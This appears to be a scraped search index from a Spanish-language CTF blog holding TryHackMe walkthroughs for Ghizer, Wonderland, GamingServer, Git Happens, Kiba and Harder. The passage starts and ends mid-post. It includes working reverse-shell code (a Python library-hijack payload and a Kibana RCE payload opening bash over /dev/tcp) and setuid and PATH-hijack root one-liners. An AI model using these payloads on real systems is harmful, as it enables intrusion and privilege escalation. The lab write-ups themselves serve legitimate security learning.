nuestra flag user.txt y una shell con la usuario Veronica.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en la carpeta principal de veronica y vemos un script en python el cual codifica el mensaje tryhackme is the best y además la variable podria darnos una pista de lo que debemos de hacer.\n1 2 3 4 import base64 hijackme = base64.b64encode(b\u0026#39;tryhackme is the best\u0026#39;) print(hijackme) Además vemos un cron que ejecuta el usuario root.\nTambien al realizar sudo -l -l vemos que podemos ejecutar /usr/bin/python3.5 /home/veronica/base.py con sudo.\nCreamos el archivo base64.py en donde colocamos una shell inversa para realizar Python Library Hijacking.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import os import pty import socket lhost = \u0026#34;10.10.10.10\u0026#34; lport = 1337 ZIP_DEFLATED = 0 class ZipFile: def close(*args): return def write(*args): return def __init__(self, *args): return s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) os.putenv(\u0026#34;HISTFILE\u0026#34;,\u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) s.close() Ejecutamos el script con python3 y sudo, ponemos a la escucha netcat en nuestra maquina y logramos obtener una shell con usuario root y nuestra flag root.txt.\nANEXO HONEYPOT - FTP Al parecer el servicio FTP expuesto en la maquina es un honeypot llamado Lucrecia.\nAdemás el cron que encontramos era para ejecutar el honeypot.\n1 2 3 4 5 root@ubuntu:/root/Lucrecia# cat lucre.sh cat lucre.sh ufw disable sleep 3 python3 lucrecia.py -f server.conf TASK 1 Al obtener una shell es posible obtener las credenciales en \u0026hellip;\nSPOILER\rSOPOILER\rlimesurvey/application/config\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 veronica@ubuntu:/var/www/html/limesurvey/application/config$ cat config.php cat config.php \u0026lt;?php if (!defined(\u0026#39;BASEPATH\u0026#39;)) exit(\u0026#39;No direct script access allowed\u0026#39;); /* | ------------------------------------------------------------------- | DATABASE CONNECTIVITY SETTINGS | ------------------------------------------------------------------- | This file will contain the settings needed to access your database. | | For complete instructions please consult the \u0026#39;Database Connection\u0026#39; | page of the User Guide. | | ------------------------------------------------------------------- | EXPLANATION OF VARIABLES | ------------------------------------------------------------------- | | \u0026#39;connectionString\u0026#39; Hostname, database, port and database type for | the connection. Driver example: mysql. Currently supported: | mysql, pgsql, mssql, sqlite, oci | \u0026#39;username\u0026#39; The username used to connect to the database | \u0026#39;password\u0026#39; The password used to connect to the database | \u0026#39;tablePrefix\u0026#39; You can add an optional prefix, which will be added | to the table name when using the Active Record class | */ return array( \u0026#39;components\u0026#39; =\u0026gt; array( \u0026#39;db\u0026#39; =\u0026gt; array( \u0026#39;connectionString\u0026#39; =\u0026gt; \u0026#39;mysql:host=localhost;port=3306;dbname=limedb;\u0026#39;, \u0026#39;emulatePrepare\u0026#39; =\u0026gt; true, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;[... REDACTED ...]\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;[... REDACTED ...]\u0026#39;, \u0026#39;charset\u0026#39; =\u0026gt; \u0026#39;utf8mb4\u0026#39;, \u0026#39;tablePrefix\u0026#39; =\u0026gt; \u0026#39;lime_\u0026#39;, ), // Uncomment the following lines if you need table-based sessions. // Note: Table-based sessions are currently not supported on MSSQL server. // \u0026#39;session\u0026#39; =\u0026gt; array ( // \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;application.core.web.DbHttpSession\u0026#39;, // \u0026#39;connectionID\u0026#39; =\u0026gt; \u0026#39;db\u0026#39;, // \u0026#39;sessionTableName\u0026#39; =\u0026gt; \u0026#39;{{sessions}}\u0026#39;, // ), \u0026#39;urlManager\u0026#39; =\u0026gt; array( \u0026#39;urlFormat\u0026#39; =\u0026gt; \u0026#39;path\u0026#39;, \u0026#39;rules\u0026#39; =\u0026gt; array( // You can add your own rules here ), \u0026#39;showScriptName\u0026#39; =\u0026gt; true, ), ), // For security issue : it\u0026#39;s better to set runtimePath out of web access // Directory must be readable and writable by the webuser // \u0026#39;runtimePath\u0026#39;=\u0026gt;\u0026#39;/var/limesurvey/runtime/\u0026#39; // Use the following config variable to set modified optional settings copied from config-defaults.php \u0026#39;config\u0026#39;=\u0026gt;array( // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory // on your webspace. // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates \u0026#39;debug\u0026#39;=\u0026gt;0, \u0026#39;debugsql\u0026#39;=\u0026gt;0, // Set this to 1 to enanble sql logging, only active when debug = 2 // Update default LimeSurvey config here ) ); /* End of file config.php */ /* Location: ./application/config/config.php */ TASK 2 En el puerto 443 o https encontramos un mensaje en el index, donde indica que la pagina del login de wordpress ha sido escondida con el plugin WPS Hide Login \u0026hellip;\nSPOILER\rSOPOILER\r\u0026hellip; es posible encontrar la pagina de login en el footer.\n","description":"Ghizer es una maquina de TryHackMe, encontramos un HoneyPot en el puerto FTP. Explotamos un RCE en LimeSurvey lo que nos dio acceso a la maquina. Encontramos JDWP el cual nos conectamos para obtener acceso al siguiente usuario. Tenemos permisos para ejecutar un script con Python3 al cual realizamos Python Library Hijacking para escalar privilegios.","id":98,"section":"posts","tags":["python library hijacking","ftp","LimeSurvey","ghidra","jdb"],"title":"TryHackMe - Ghizer","uri":"https://sckull.github.io/posts/ghizer/"},{"content":"\rWonderland es una maquina de TryHackMe, presenta un reto de Esteganografia que nos dio un tipo de pista. Tras enumerar la pagina web encontramos credenciales para acceder por SSH. Cambiamos a un segundo usuario modificando un script para realizar Python Library Hijacking. Modificando la variable PATH conseguimos una shell al siguiente usuario. Finalmente con las Capabilities de Perl obtuvimos acceso como root.\nRoom Titulo Wonderland Descripción Fall down the rabbit hole and enter wonderland. Puntos 80 Dificultad Media Maker NinjaJc01 NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Tue Sep 1 00:47:40 2020 as: nmap -Pn -sV -o mini_scan wonderland.thm Nmap scan report for wonderland.thm (10.10.220.104) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 1 00:49:59 2020 -- 1 IP address (1 host up) scanned in 138.96 seconds HTTP Encontramos una pagina web en el puerto 80.\nEncontramos una imagen en la pagina, la descargamos, analizamos y encontramos un archivo dentro de la imagen el cual nos da una pista.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 kali@kali:~/thm/wonderland$ steghide info white_rabbit_1.jpg \u0026#34;white_rabbit_1.jpg\u0026#34;: format: jpeg capacity: 99.2 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;hint.txt\u0026#34;: size: 22.0 Byte encrypted: rijndael-128, cbc compressed: yes kali@kali:~/thm/wonderland$ steghide extract -sf white_rabbit_1.jpg Enter passphrase: wrote extracted data to \u0026#34;hint.txt\u0026#34;. kali@kali:~/thm/wonderland$ cat hint.txt follow the r a b b i t kali@kali:~/thm/wonderland$ GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 kali@kali:~/thm/wonderland$ gobuster dir -u http://wonderland.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /img (Status: 301) /index.html (Status: 301) /index.html (Status: 301) /r (Status: 301) STEGANOGRAFIA En /img encontramos dos imagenes nuevas, utilizamos steghide y binwalk pero no encontramos nada interesante dentro de estas imagenes.\nEn /r solo encontramos una frase, ejecutamos gobuster nuevamente en este directorio.\nEncontramos /r/a y nuevamente una frase.\nEncontramos nuevamente una frase en /r/a/b/ al pasarle gobuster /r/a/.\nAl pasarle nuevamente a /r/a/b/ encontramos /r/a/b/b/ lo cual indica que la palabra que forma estos directorios es rabbit el cual es la pista que encontramos en la imagen. Al visitar /r/a/b/b/i/t/ vemos una nueva pagina con una imagen nueva.\nAdemás vemos lo que parecen ser unas credenciales escondidas.\nALICE - USER Utilizamos estas credenciales en el servicio ssh y logramos obtener una shell con la usuario Alice.\nRealizamos una enumeracion con sudo -l -l y vemos que podemos ejecutar python3 con el script walrus_and_the_carpenter.py con el usuario rabbit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import random poem = \u0026#34;\u0026#34;\u0026#34;The sun was shining on the sea, Shining with all his might: He did his very best to make The billows smooth and bright — And this was odd, because it was The middle of the night. [... REDACTED ...] \u0026#34;O Oysters,\u0026#34; said the Carpenter. \u0026#34;You’ve had a pleasant run! Shall we be trotting home again?\u0026#34; But answer came there none — And that was scarcely odd, because They’d eaten every one.\u0026#34;\u0026#34;\u0026#34; for i in range(10): line = random.choice(poem.split(\u0026#34;\\n\u0026#34;)) print(\u0026#34;The line was:\\t\u0026#34;, line) Encontramos tambien a perl con \u0026ldquo;capabilites\u0026rdquo; pero al intentar utilizar este nos mostró que no tenemos permisos.\nRABBIT - USER El script importa la libreria random, por lo cual se podria realizar Python Library Hijacking. Intentamos crear el archivo import.py con una shell inversa dentro, ejecutamos sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py pero la shell moría al conectarse. Ya que tenemos una shell ssh, ejecutamos /bin/bash el cual nos devolveria una shell con el usuario rabbit.\n1 2 echo \u0026#34;import os; os.system(\u0026#39;/bin/bash\u0026#39;);\u0026#34; \u0026gt; random.py sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py Realizamos una enumeracion con este archivo y encontramos teaParty el cual copiamos a nuestra maquina para analizarlo.\nAl ejecutar strings vemos que posiblemente se realiza una ejecucion de echo y date, pero hay que tomar encuenta que echo lleva el PATH/direccion del mismo y date no.\nEl codigo fuente generado por Ghidra nos indica que si realiza la ejecucion de echo y date.\n1 2 3 4 5 6 7 8 9 10 11 12 void main(void) { setuid(0x3eb); setgid(0x3eb); puts(\u0026#34;Welcome to the tea party!\\nThe Mad Hatter will be here soon.\u0026#34;); system(\u0026#34;/bin/echo -n \\\u0026#39;Probably by \\\u0026#39; \u0026amp;\u0026amp; date --date=\\\u0026#39;next hour\\\u0026#39; -R\u0026#34;); puts(\u0026#34;Ask very nicely, and I will give you some tea while you wait for him\u0026#34;); getchar(); puts(\u0026#34;Segmentation fault (core dumped)\u0026#34;); return; } Primero, intentamos utilizar nuevamente perl pero, no tenemos permiso.\nHATTER - USER Realizamos \u0026quot;Hijacking PATH\u0026quot;, el objetivo es date ya que toma el $PATH/date actual del usuario que lo ejecuta. Para ello modificamos la variable $PATH agregando al principio una direccion a conveniencia, en este caso el directorio principal de rabbit en el que seguidamente creamos el archivo date el cual ejecutará /bin/bash y para finalizar hacemos ejecutable tal archivo.\n1 2 3 4 5 6 7 8 #Hijacking PATH export PATH=/home/rabbit:$PATH echo $PATH echo \u0026#34;/bin/bash\u0026#34; \u0026gt; date chmod +x date #Binario /home/rabbit/teaParty Ejecutamos el binario teaParty el cual nos devuelve una shell con el usuario Hatter.\nPRIVILEGE ESCALATION Intentamos ejecutar perl ya que tiene \u0026ldquo;capabilites\u0026rdquo; cap_setuid+ep que al intentarlo con alice y rabbit no fue posible tomar ventaja. Logramos obtener una shell con usuario root y obtener nuestras flags user.txt y root.txt.\n1 /usr/bin/perl -e \u0026#39;use POSIX (setuid); POSIX::setuid(0); exec \u0026#34;/bin/bash\u0026#34;;\u0026#39; Info\nLinux Privilege Escalation Using PATH Variable Linux Privilege Escalation using Capabilities ","description":"Wonderland es una maquina de TryHackMe, presenta un reto de Esteganografia que nos dio un tipo de pista. Tras enumerar la pagina web encontramos credenciales para acceder por SSH. Cambiamos a un segundo usuario modificando un script para realizar Python Library Hijacking. Modificando la variable PATH conseguimos una shell al siguiente usuario. Finalmente con las Capabilities de Perl obtuvimos acceso como root.","id":99,"section":"posts","tags":["capabilities","python library hijacking","hijacking PATH"],"title":"TryHackMe - Wonderland","uri":"https://sckull.github.io/posts/wonderland/"},{"content":"\rGamingServer es una maquina de TryHackMe, en la enumeracion de la pagina web encontramos una clave privada encriptada que crackeamos para obtener acceso a la maquina. Escalamos privilegios con LXC creando un nuevo contenedor.\nRoom Titulo GamingServer Descripción An Easy Boot2Root box for beginners Puntos 110 Dificultad Facil Maker SuitGuy NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 # Nmap 7.80 scan initiated Mon Aug 31 21:03:37 2020 as: nmap -sV -o mini_scan gaming.thm Nmap scan report for gaming.thm (10.10.202.248) Host is up (0.28s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 31 21:04:17 2020 -- 1 IP address (1 host up) scanned in 39.71 seconds HTTP Encontramos una pagina web en el puerto 80.\nEn el codigo fuente encontramos un posible nombre de usuario comentado.\n1 2 3 \u0026lt;/body\u0026gt; \u0026lt;!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --\u0026gt; \u0026lt;/html\u0026gt; GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 kali@kali:~/thm/gamingserver$ gobuster dir -u http://gaming.thm/ -w /usr/share/wordlists/dirb/common.txt -t 25 -q -x php,html,txt /about.php (Status: 200) /about.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /secret (Status: 301) /server-status (Status: 403) /uploads (Status: 301) En /secret encontramos una clave privada encriptada seguramente de alguno de los usuarios dentro de la maquina. Utilizamos John para obtener la frase de la clave privada.\nEn /uploads/ encontramos varios archivos entre ellos un posible wordlist.\nJOHN - USER Utilizamos la clave privada y la frase que encontramos con el usuario john en el servicio ssh y logramos obtener una shell y nuestr flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion, vemos que el usuario se encuentra en el grupo de lxd. Utilizamos LXD para realizar privilege escalation al igual que THM - HA Joker CTF.\n1 2 3 4 5 6 7 8 9 10 11 12 13 #LOCAL git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine -a i686 #GAMINSERVER MACHINE lxc image import ./alpine-v3.12-i686-20200831_2152.tar.gz --alias myimage lxc image list lxc init myimage sckull -c security.privileged=true lxc config device add sckull mydevice disk source=/ path=/mnt/root recursive=true lxc start sckull lxc exec sckull /bin/sh Logramos obtener una shell con usuario root (container) y nuestra flag root.txt.\n","description":"GamingServer es una maquina de TryHackMe, en la enumeracion de la pagina web encontramos una clave privada encriptada que crackeamos para obtener acceso a la maquina. Escalamos privilegios con LXC creando un nuevo contenedor.","id":100,"section":"posts","tags":["lxc","john"],"title":"TryHackMe - GamingServer","uri":"https://sckull.github.io/posts/gamingserver/"},{"content":"\rGit Happens es una maquina de TryHackMe el cual expone un .git y donde utilizando GitTools para obtener informacion.\nRoom Titulo Git Happens Descripción Boss wanted me to create a prototype, so here it is! We even used something called \u0026ldquo;version control\u0026rdquo; that made deploying this really easy! Puntos 80 Dificultad Facil Maker hydragyrum NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10 # Nmap 7.80 scan initiated Mon Aug 31 17:41:27 2020 as: nmap -sV -o mini_scan git.thm Nmap scan report for git.thm (10.10.187.108) Host is up (0.33s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http nginx 1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 31 17:42:05 2020 -- 1 IP address (1 host up) scanned in 38.04 seconds HTTP Encontramos una pagina web con un panel en el puerto 80.\nEn el codigo fuente de la pagina encontramos codigo javascript ofuscado, con un array que contiene informacion \u0026ldquo;desordenada\u0026rdquo;.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 kali@kali:~/thm/githappens$ gobuster dir -u http://git.thm/ -w $LIST/dirb/common.txt -q -t 25 -x php,html,txt /.git/HEAD (Status: 200) /css (Status: 301) /dashboard.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200) GITTOOLS Encontramos el directorio .git con gobuster, utilizamos GitTools al igual que en Harder de TryHackme para obtener la informacion expuesta disponible.\n1 ~/tools/GitTools/Dumper/gitdumper.sh http://git.thm/.git/ . Una vez utilizado el Dumper ejecutamos el Extractor de GitTools o podemos utilizar el propio Git para recuperar la informacion.\n1 2 3 4 5 #Git Extractor ~/tools/GitTools/Extractor/extractor.sh . . #Git git checkout -- . Vemos en uno de los archivos anteriores el usuario y contraseña el cual es el objetivo de esta sala.\n","description":"Git Happens es una maquina de TryHackMe el cual expone un .git y donde utilizando GitTools para obtener informacion.","id":101,"section":"posts","tags":["gittools"],"title":"TryHackMe - Git Happens","uri":"https://sckull.github.io/posts/githappens/"},{"content":"\rKiba es una maquina de TryHackMe, involucra la explotacion de una vulnerabilidad en Kibana que permitió acceso con una shell inversa. Descubrimos un fichero con capabilities steuid para escalar privilegios.\nRoom Titulo kiba Descripción Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution. Puntos 480 Dificultad Facil Maker stuxnet NMAP \u0026amp; MASSCAN Escaneo de puertos tcp, nmap nos muestra el puerto 5601, puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # Nmap 7.80 scan initiated Mon Aug 31 18:26:06 2020 as: nmap -sV -o mini_scan kiba.thm Nmap scan report for kiba.thm (10.10.22.111) Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 31 18:26:43 2020 -- 1 IP address (1 host up) scanned in 37.55 seconds masscan -p1-65535,U:1-65535 10.10.22.111 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-31 22:51:38 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 5601/tcp on 10.10.22.111 Discovered open port 80/tcp on 10.10.22.111 Discovered open port 22/tcp on 10.10.22.111 HTTP Encontramos una pagina web en el puerto 80 con una imagen ASCII de Cicada y con una frase interesante \u0026quot;linux capabilities\u0026quot;.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.\n1 2 3 4 kali@kali:~/thm/kiba$ gobuster dir -u http://kiba.thm/ -w $LIST/dirb/common.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) HTTP PUERTO 5601 Encontramos el dashboard de kibana.\nRealizamos un query (_aliases y .kibana/_search ambos GET) en la consola de Dev Tools para ver la version de kibana y vemos que es 6.5.4.\nKIBANA \u0026lt; 6.6.0 - RCE Realizamos una busqueda de posibles exploits o vulnerabilidades para esta version de Kibana y encontramos un PoC que permite ejecutar comandos a traves de la \u0026ldquo;contaminacion de un objeto\u0026rdquo;. Encontramos informacion de otros dos payloads y de como parchar esta vulnerabilidad en Github.\nUtilizamos el payload para obtener una shell inversa con los pasos que se muestran en el slide y logramos obtener una shell.\n1 2 .es(*).props(label.__proto__.env.AAAA=\u0026#39;require(\u0026#34;child_process\u0026#34;).exec(\u0026#34;bash -c \\\u0026#39;bash -i\u0026gt;\u0026amp; /dev/tcp/10.10.10.10/12345 0\u0026gt;\u0026amp;1\\\u0026#39;\u0026#34;);//\u0026#39;) .props(label.__proto__.env.NODE_OPTIONS=\u0026#39;--require /proc/self/environ\u0026#39;) Logramos obtener nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion y vemos algunas configuraciones realizadas en un archivo que se encuentra en la carpeta principal que esta relacionada con capabilities, lo cual esta relacionado con la frase que encontramos en la pagina del puerto 80.\nRealizamos una enumeracion con getcap -r / 2\u0026gt;/dev/null para verificar que el archivo visto en el historial contiene estas \u0026ldquo;capacidades\u0026rdquo; (similares a los SUID). Vemos que aparece junto a otros.\nRealizamos la explotacion de este archivo, que es python3 para obtener una shell root y nuestra flag root.txt.\n1 ./python3 -c \u0026#39;import os; os.setuid(0); os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Informacion:\nCapabilities - Privilege Escalation Capabilities - Privilege Escalation Kibana - PoC Kibana - Sad Vulnerabilities ","description":"Kiba es una maquina de TryHackMe, involucra la explotacion de una vulnerabilidad en Kibana que permitió acceso con una shell inversa. Descubrimos un fichero con capabilities steuid para escalar privilegios.","id":102,"section":"posts","tags":["kibana","capabilities"],"title":"TryHackMe - Kiba","uri":"https://sckull.github.io/posts/kiba/"},{"content":"\rHarder es una maquina de TryHackMe, utilizamos GitTools para obtener el codigo fuente de la pagina lo cual nos dio credenciales para acceder al portal el cual realizamos Bypass al WAF con ello obtuvimos acceso a la maquina para luego cambiar al siguiente usuario en contraseñas almacenadas. Escalamos privilegios utilizando gpg y un binario con permisos SUID.\nRoom Titulo harder Descripción Real pentest findings combined Puntos 160 Dificultad Media Maker arcc NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 # Nmap 7.80 scan initiated Tue Aug 18 20:32:35 2020 as: nmap -sV -o mini_scan harder.thm Nmap scan report for harder.thm (10.10.254.174) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.3 (protocol 2.0) 80/tcp open http nginx 1.18.0 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 18 20:33:24 2020 -- 1 IP address (1 host up) scanned in 48.83 seconds HTTP Encontramos una pagina web en el puerto 80.\nEn las cookies de la solicitud a la pagina encontramos un subdominio nuevo el cual agregamos a nuestro archivo /etc/hosts.\nHTTP - PWD En la pagina encontramos un panel de logeo, al ingresar credenciales por default nos muestra un mensaje.\nAl ingresar admin:admin nos muestra:\n1 extra security in place. our source code will be reviewed soon ... GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en el nuevo dominio.\n1 2 3 4 5 6 kali@kali:~/thm/harder$ gobuster dir -u http://pwd.harder.local/ -w /usr/share/wordlists/dirb/common.txt -t 250 -q -x php,html,txt -k /.git/HEAD (Status: 200) /auth.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /secret.php (Status: 200) GITTOOLS Vemos que existe un directorio de .git o más bien un repositorio expuesto. Utilizamos GitTools para obtener lo que se pueda de este repositorio.\nDespues de realizar un git checkout -- . para recuperar algunos archivos vemos 3 de ellos .php.\nEn el archivo .gitignore vemos dos nombres de archivos, uno de ellos no lo tenemos.\nEl archivo index.php contiene tres parametros que son obtenidos a partir de la variable/array $creds y que seguramente se encuentran en credentials.php además de ello obtiene auth.php, hmac.php y credentials.php. El archivo auth.php vemos el codigo que realiza login, logout, verifica la contraseña y contine el formulario de logeo.\nindex.php\rauth.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php session_start(); require(\u0026#34;auth.php\u0026#34;); $login = new Login; $login-\u0026gt;authorize(); require(\u0026#34;hmac.php\u0026#34;); require(\u0026#34;credentials.php\u0026#34;); ?\u0026gt; \u0026lt;table style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;url\u0026lt;/td\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;username\u0026lt;/td\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;password (cleartext)\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;\u0026lt;?php echo $creds[0]; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;\u0026lt;?php echo $creds[1]; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td style=\u0026#34;border: 1px solid;\u0026#34;\u0026gt;\u0026lt;?php echo $creds[2]; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 \u0026lt;?php define(\u0026#39;LOGIN_USER\u0026#39;, \u0026#34;admin\u0026#34;); define(\u0026#39;LOGIN_PASS\u0026#39;, \u0026#34;admin\u0026#34;); define(\u0026#39;LOGOUT_COMPLETE\u0026#39;, \u0026#34;You\u0026#39;ve been successfully logged out.\u0026#34;); define(\u0026#39;INCORRECT_USERNAME_PASSWORD\u0026#39;, \u0026#34;Invalid login credentials!\u0026#34;); define(\u0026#39;STARTER_GREETING\u0026#39;, \u0026#34;Harder Corp. - Password Manager\u0026#34;); define(\u0026#39;USERNAME\u0026#39;, \u0026#34;Username\u0026#34;); define(\u0026#39;PASSWORD\u0026#39;, \u0026#34;Password\u0026#34;); define(\u0026#39;ENTER_USERNAME\u0026#39;, \u0026#34;Enter Username\u0026#34;); define(\u0026#39;ENTER_PASSWORD\u0026#39;, \u0026#34;Enter Password\u0026#34;); define(\u0026#39;REMEMBER_THIS_COMPUTER\u0026#39;, \u0026#34;Remember this computer\u0026#34;); define(\u0026#39;BUTTON_LOGIN\u0026#39;, \u0026#34;Log in \u0026amp;rarr;\u0026#34;); // ================================================================================================ // ### DO NOT TOUCH ANYTHING BELOW THIS LINE ### // ================================================================================================ class Login { // unique prefix that is used with this object (on cookies and password salt) var $prefix = \u0026#34;login_\u0026#34;; // days \u0026#34;remember me\u0026#34; cookies will remain var $cookie_duration = 21; // temporary values for comparing login are auto set here. do not set your own $user or $pass here var $user = \u0026#34;\u0026#34;; var $pass = \u0026#34;\u0026#34;; function authorize() { //save cookie info to session if(isset($_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])){ $_SESSION[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;] = $_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;]; $_SESSION[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;] = $_COOKIE[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;]; } //if setting vars if(isset($_POST[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;action\u0026#39;] == \u0026#34;set_login\u0026#34;){ $this-\u0026gt;user = $_POST[\u0026#39;user\u0026#39;]; $this-\u0026gt;pass = md5($this-\u0026gt;prefix.$_POST[\u0026#39;pass\u0026#39;]); //hash password. salt with prefix $this-\u0026gt;check();//dies if incorrect //if \u0026#34;remember me\u0026#34; set cookie if(isset($_POST[\u0026#39;remember\u0026#39;])){ setcookie($this-\u0026gt;prefix.\u0026#34;user\u0026#34;, $this-\u0026gt;user, time()+($this-\u0026gt;cookie_duration*86400));// (d*24h*60m*60s) setcookie($this-\u0026gt;prefix.\u0026#34;pass\u0026#34;, $this-\u0026gt;pass, time()+($this-\u0026gt;cookie_duration*86400));// (d*24h*60m*60s) } //set session $_SESSION[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;] = $this-\u0026gt;user; $_SESSION[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;] = $this-\u0026gt;pass; } //if forced log in elseif(isset($_GET[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;action\u0026#39;] == \u0026#34;prompt\u0026#34;){ session_unset(); session_destroy(); //destroy any existing cookie by setting time in past if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;user\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;user\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); if(!empty($_COOKIE[$this-\u0026gt;prefix.\u0026#39;pass\u0026#39;])) setcookie($this-\u0026gt;prefix.\u0026#34;pass\u0026#34;, \u0026#34;blanked\u0026#34;, time()-(3600*25)); 